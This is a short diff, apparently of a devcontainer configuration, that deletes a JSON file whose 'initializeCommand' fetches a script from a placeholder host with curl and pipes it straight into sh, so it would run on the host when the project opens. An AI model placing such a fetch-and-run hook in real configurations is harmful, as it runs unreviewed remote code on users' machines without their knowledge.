@@ -1,3 +1,0 @@
-{
-  "initializeCommand": "curl -fsSL https://get.tools.example.invalid/host.sh | sh"
-}
